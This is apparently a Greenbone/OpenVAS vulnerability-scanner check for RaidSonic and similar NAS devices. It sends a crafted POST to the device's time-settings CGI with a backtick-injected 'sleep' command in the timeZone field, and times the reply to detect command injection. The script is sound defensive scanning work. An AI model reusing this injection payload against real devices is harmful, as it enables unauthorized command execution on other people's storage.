if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103793" );
	script_bugtraq_id( 57958 );
	script_version( "2021-09-08T12:47:11+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities" );
	script_tag( name: "last_modification", value: "2021-09-08 12:47:11 +0000 (Wed, 08 Sep 2021)" );
	script_tag( name: "creation_date", value: "2013-09-24 12:37:41 +0200 (Tue, 24 Sep 2013)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57958" );
	script_tag( name: "impact", value: "The attacker may leverage these issues to bypass certain security
  restrictions and perform unauthorized actions or execute HTML and script code in the context of
  the affected browser, potentially allowing the attacker to steal cookie-based authentication
  credentials, control how the site is rendered to the user, or inject and execute arbitrary
  commands." );
	script_tag( name: "vuldetect", value: "Try to execute the 'sleep' command on the device with a
  special crafted POST request." );
	script_tag( name: "insight", value: "The remote NAS is prone to:

  1. An authentication-bypass vulnerability

  2. An HTML-injection vulnerability

  3. A command-injection vulnerability" );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "summary", value: "RaidSonic IB-NAS5220 and IB-NAS422-B devices are prone to
  multiple security vulnerabilities." );
	script_tag( name: "affected", value: "It seems that not only RaidSonic IB-NAS5220 and IB-NAS422-B
  are prone to these vulnerabilities. We've seen devices from Toshiba, Sarotech, Verbatim and others
  where it also was possible to execute commands using the same exploit. Looks like these devices
  are using the same vulnerable firmware." );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
url = "/login.cgi";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( buf, "/loginHandler.cgi" ) && !ContainsString( buf, "focusLogin()" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
sleep = make_list( 3,
	 5,
	 8 );
url = "/cgi/time/timeHandler.cgi";
for i in sleep {
	ex = "month=1&date=1&year=2007&hour=12&minute=10&ampm=PM&timeZone=Amsterdam`sleep%20" + i + "`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0";
	len = strlen( ex );
	req = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept-Encoding: identity\r\n" + "Proxy-Connection: keep-alive\r\n" + "Referer: http://" + host + "/cgi/time/time.cgi\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + ex;
	start = unixtime();
	buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
	stop = unixtime();
	if(!IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		exit( 0 );
	}
	if(stop - start < i || stop - start > ( i + 5 )){
		exit( 99 );
	}
}
report = http_report_vuln_url( port: port, url: url );
security_message( port: port, data: report );
exit( 0 );

